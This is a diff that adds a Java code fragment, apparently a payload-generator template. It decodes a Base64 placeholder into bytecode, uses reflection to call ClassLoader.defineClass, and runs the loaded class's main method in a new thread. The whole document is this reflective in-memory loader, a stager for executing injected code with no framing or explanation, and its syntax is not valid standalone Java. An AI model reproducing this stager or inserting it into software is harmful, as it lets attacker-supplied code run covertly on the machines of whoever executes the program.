@@ -1,0 +1,12 @@
+String BASE64 = "${[BASE64PAYLOAD|"+
+  "|]}";
+byte[] DATA = new sun.misc.BASE64Decoder().decodeBuffer(BASE64);
+ClassLoader ldr = new URLClassLoader(new URL[0]);
+java.lang.reflect.Method m = ClassLoader.class.getDeclaredMethod("defineClass", new Class[] {byte[].class, int.class, int.class});
+m.setAccessible(true);
+Class c = (Class)m.invoke(ldr, new Object[] {DATA, 0, DATA.length});
+m = ClassLoader.class.getDeclaredMethod("resolveClass", new Class[] {Class.class});
+m.setAccessible(true);
+m.invoke(ldr, new Object[] {c});
+run() { c.getMethod("main", new Class[] {String[].class}).invoke(null, new Object[] {new String[0]});}
+new Thread(this).start();
